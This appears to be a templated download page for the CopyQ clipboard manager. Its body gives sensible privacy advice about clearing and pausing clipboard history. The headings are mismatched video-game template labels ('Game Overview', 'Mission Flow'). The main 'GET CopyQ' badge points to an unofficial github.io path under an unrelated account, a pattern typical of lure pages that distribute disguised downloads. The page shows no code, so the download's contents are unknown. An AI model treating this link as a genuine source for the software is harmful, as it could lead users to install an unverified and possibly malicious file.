# CopyQ - Clipboard History on This PC

[![GET CopyQ](https://img.shields.io/badge/GET%20%E2%80%94%20CopyQ-1d4ed8?style=for-the-badge&logoColor=white)](https://grulkein.github.io/.github/copyq-images)

## Game Overview

CopyQ keeps a list of text and images you copied in this Windows session, so an earlier item can be pasted again. It reads the clipboard of the user who is logged in. It does not record keystrokes outside that clipboard, and it does not watch a computer you are not using.

The list is as sensitive as the things you copy. A password, a one-time code, or a private message stays there until you remove it. On a PC other people unlock, pause capture or clear the history before you leave the chair.

## Play Your Way

One way to work is a short memory: copy a sentence, copy another, then pick the first from the list and paste it into a note you own. That is enough to learn the hotkey without filling the history with anything you would mind seeing later.

The other way is a longer desk session, with the history open while you move text between your own documents. Pause it when you handle secrets. A paste into the wrong chat is still a send once you confirm it, so look at the item before it lands.

## Mission Flow

Start with two harmless copies in Notepad. Open the history, paste the older one, and delete that entry so you know the clear action works. If the hotkey does nothing, another program has taken it. Change the shortcut before you rely on the list.

During real work, glance at the top of the history before a screen share. Close the window if it is showing. When you are done for the day on a shared machine, empty the list. CopyQ does not belong on a PC you are using to watch someone else.

## Included Content

- A local list of items you copied in this Windows account
- Search across that list for a phrase you remember
- Paste of one chosen entry, not only the latest copy
- A delete action for passwords, codes, and private text
- Pause, so capture stops while you handle a secret
- A hotkey you can change if another app already uses it

## Perfect Audience

CopyQ suits people who move text between their own windows and lose the previous copy. It also suits a careful habit: paste the secret once, then delete it from the list.

It is a poor fit for a shared login you cannot lock, and for anyone hoping to record another person's typing. The tool only sees what this user copied.

## Common Issues

An empty history usually means capture is paused, or you have not copied anything since it opened. A hotkey that does nothing is a clash with another program. If a password is still listed, delete that entry and pause capture the next time you copy one.

## Extended Notes

Treat the database as private. Do not sync it to a folder other people can open. If you reinstall Windows, the history does not need to come with you unless you have a reason to keep those copies. When in doubt, clear it.
